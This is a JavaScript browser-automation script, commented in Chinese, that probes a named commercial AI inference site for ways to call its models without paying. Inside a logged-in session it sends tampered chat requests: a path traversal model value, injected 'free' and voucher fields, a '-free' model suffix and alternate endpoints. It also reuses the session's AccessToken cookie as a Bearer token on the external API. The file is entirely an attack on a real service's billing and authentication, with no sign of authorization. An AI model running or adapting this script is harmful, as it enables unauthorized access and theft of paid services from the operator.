// HPC-AI 模型调用绕过探测（在已登录页面上下文执行，用 cookie session）
async (page) => {
  const ctx = page.context();
  const base = 'https://www.hpc-ai.com';
  const out = { tests: [] };
  const glm = 'zai-org/glm-5.2';
  const basicBody = { messages: [{ role: 'user', content: 'say pong' }], model: glm, stream: false, max_tokens: 16, temperature: 0 };

  async function trial(label, url, opts) {
    try {
      const r = await ctx.request.fetch(url, opts);
      let body = ''; try { body = (await r.text()).slice(0, 300); } catch (e) { body = '(binary?)'; }
      out.tests.push({ label, status: r.status(), body });
    } catch (e) { out.tests.push({ label, error: String(e).slice(0, 200) }); }
  }

  const j = (o) => JSON.stringify(o);
  const post = (url, body, extraHeaders) => ({
    method: 'POST',
    headers: Object.assign({ 'Content-Type': 'application/json', Accept: 'application/json' }, extraHeaders || {}),
    data: j(body)
  });

  // A. /api/chat 基线（cookie）
  await trial('A /api/chat baseline cookie', base + '/api/chat', post(base + '/api/chat', basicBody));
  // B. stream:true（playground 默认）
  await trial('B /api/chat stream=true', base + '/api/chat', post(base + '/api/chat', Object.assign({}, basicBody, { stream: true })));
  // C. 不带 model 字段
  await trial('C /api/chat no model', base + '/api/chat', post(base + '/api/chat', { messages: [{ role: 'user', content: 'hi' }], stream: false }));
  // D. model id 注入 / 路径穿越
  await trial('D model path traversal', base + '/api/chat', post(base + '/api/chat', Object.assign({}, basicBody, { model: '../../../etc/passwd' })));
  // E. model 数组注入
  await trial('E model as array', base + '/api/chat', post(base + '/api/chat', Object.assign({}, basicBody, { model: [glm, 'free'] })));
  // F. model 对象注入（带 free 标记）
  await trial('F model as object', base + '/api/chat', post(base + '/api/chat', Object.assign({}, basicBody, { model: { id: glm, free: true, applicableScope: ['MaaS'] } })));
  // G. 加 voucherScope / payment_method 字段
  await trial('G extra voucher fields', base + '/api/chat', post(base + '/api/chat', Object.assign({}, basicBody, { use_voucher: true, payment_method: 'voucher', scope: 'MaaS' })));
  // H. 路径变体
  const paths = ['/api/chat/completions', '/api/maas/v1/chat/completions', '/api/v1/chat/completions', '/api/inference/v1/chat/completions', '/api/maas/chat/completions'];
  for (let i = 0; i < paths.length; i++) {
    await trial('H path ' + paths[i], base + paths[i], post(base + paths[i], basicBody));
  }
  // I. 用 Authorization 头带 session token（看是否走另一套鉴权）
  // 取 cookie 里的 accessToken
  const cookies = await ctx.cookies();
  const at = (cookies.find(c => c.name === 'AccessToken') || {}).value || '';
  if (at) {
    await trial('I /api/chat with Bearer session token', base + '/api/chat', post(base + '/api/chat', basicBody, { Authorization: 'Bearer ' + at }));
    await trial('I2 external inference with Bearer session token', 'https://api.hpc-ai.com/inference/v1/chat/completions', post('https://api.hpc-ai.com/inference/v1/chat/completions', basicBody, { Authorization: 'Bearer ' + at }));
  }
  // J. max_tokens=0 / 免费 tier 参数
  await trial('J max_tokens=0', base + '/api/chat', post(base + '/api/chat', Object.assign({}, basicBody, { max_tokens: 0 })));
  // K. 试图触发免费试用：model 加 -free 后缀
  await trial('K model free suffix', base + '/api/chat', post(base + '/api/chat', Object.assign({}, basicBody, { model: 'zai-org/glm-5.2-free' })));
  return out;
}
